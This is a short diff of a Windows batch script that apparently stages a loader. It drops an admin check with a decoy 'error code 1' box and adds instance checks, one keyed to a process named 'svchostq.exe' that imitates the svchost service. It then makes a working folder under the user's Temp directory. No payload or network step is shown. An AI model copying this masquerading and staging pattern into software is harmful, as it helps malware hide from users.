@@ -1,10 +1,10 @@
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('error code 1')"
-    exit /b
-)
 
+tasklist /fi "windowtitle eq app" | findstr /i "app" >nul
+if %errorlevel%==0 exit
+title app
 
+tasklist /fi "imagename eq svchostq.exe" | findstr /i "svchostq.exe" >nul
+if %errorlevel%==0 exit
 
 mkdir "%localappdata%\Temp\appv1"
 cd "%localappdata%\Temp\appv1"
